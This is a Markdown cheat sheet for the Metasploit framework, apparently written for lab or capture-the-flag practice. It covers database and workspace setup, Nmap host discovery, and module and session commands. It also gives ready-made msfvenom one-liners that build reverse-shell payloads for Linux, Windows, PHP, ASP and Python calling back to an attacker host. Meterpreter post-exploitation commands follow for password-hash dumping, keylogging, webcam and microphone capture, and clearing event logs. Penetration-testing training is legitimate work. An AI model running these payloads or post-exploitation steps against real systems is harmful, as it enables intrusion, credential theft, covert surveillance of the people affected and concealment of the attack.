## ğŸ—„ Metasploit Database Setup

### Start PostgreSQL

```
systemctl start postgresql
```

### Delete existing Metasploit database

```
sudo -u postgres msfdb delete
```

### Initialize database correctly

Must be run as the postgres user.

```
sudo -u postgres msfdb init
```

### Launch Metasploit

```
msfconsole
```

### Verify database connection

```
db_status
```

---

## ğŸ“ Workspaces

### List workspaces

```
workspace
```

### Add a workspace

```
workspace -a lab_name
```

### Delete a workspace

```
workspace -d lab_name
```

### Workspace help

```
workspace -h
```

---

## ğŸ–¥ Hosts and Services

### Discover hosts with Nmap inside Metasploit

```
db_nmap <options> <target>
```

### List discovered hosts

```
hosts
```

### Add hosts to RHOSTS automatically

```
hosts -R
```

### List discovered services

```
services
```

### Search for a specific service

```
services -S http
```

### Help

```
hosts -h
services -h
```

---

## ğŸ¯ Common Low Hanging Fruit

- HTTP: SQL injection, file upload, RCE
- FTP: Anonymous login, sensitive files
- SMB: MS17-010 EternalBlue
- SSH: Weak or default credentials
- RDP: BlueKeep, weak passwords

---

## ğŸ” Modules and Payloads

### Search for modules

```
search <keyword>
```

### Module details

```
info <module>
```

### Use a module

```
use <module>
```

### Show options

```
show options
```

### Show compatible payloads

```
show payloads
```

### Set payload

```
set payload <payload_name>
```

---

## ğŸ” Sessions Management

### Background a session

```
CTRL + Z
```

### List sessions

```
sessions
```

### Interact with a session

```
sessions -i <id>
```

### Abort exploit

```
CTRL + C
```

---

## ğŸ§ª Msfvenom Basics

### List payloads

```
msfvenom --list payloads
```

### List formats

```
msfvenom --list formats
```

### Key variables

- LHOST: attacker IP
- LPORT: listening port

---

## ğŸ§ Linux Payload

```
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f elf > shell.elf
chmod +x shell.elf
./shell.elf
```

---

## ğŸªŸ Windows Payload

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f exe > shell.exe
```

---

## ğŸŒ Web Payloads

### PHP

```
msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f raw > shell.php
```

### ASP

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f asp > shell.asp
```

### Python

```
msfvenom -p cmd/unix/reverse_python LHOST=10.10.X.X LPORT=XXXX -f raw > shell.py
```

---

## ğŸ“¦ Staged vs Inline Payloads

- Staged payloads send a small loader first, then fetch the rest
- Inline payloads are sent in one step
- Meterpreter exists in both forms

To list Meterpreter payloads:

```
msfvenom --list payloads | grep meterpreter
```

---

## ğŸ§  Meterpreter Core Commands

### Core

```
background
exit
help
info
load
migrate
sessions
```

### Process and System

```
getpid
getuid
ps
migrate <pid>
sysinfo
execute
shell
```

### Privilege and Credentials

```
getsystem
hashdump
```

---

## ğŸ“‚ File System

```
cd
ls
pwd
cat
edit
rm
search
upload
download
```

---

## ğŸŒ Networking

```
ifconfig
netstat
arp
route
portfwd
```

---

## ğŸ¥ Surveillance and Interaction

```
screenshot
screenshare
keyscan_start
keyscan_dump
keyscan_stop
webcam_list
webcam_snap
record_mic
```

---

## ğŸ§¹ Cleanup and Control

```
clearev
kill
pkill
reboot
shutdown
```

---

## ğŸ§  Practical Tips

- Always check `getuid` before privilege escalation
- Migrate to a stable process after exploitation
- Use `search` to find sensitive files
- `hashdump` requires SYSTEM level access
- Meterpreter payload choice may be limited by the exploit
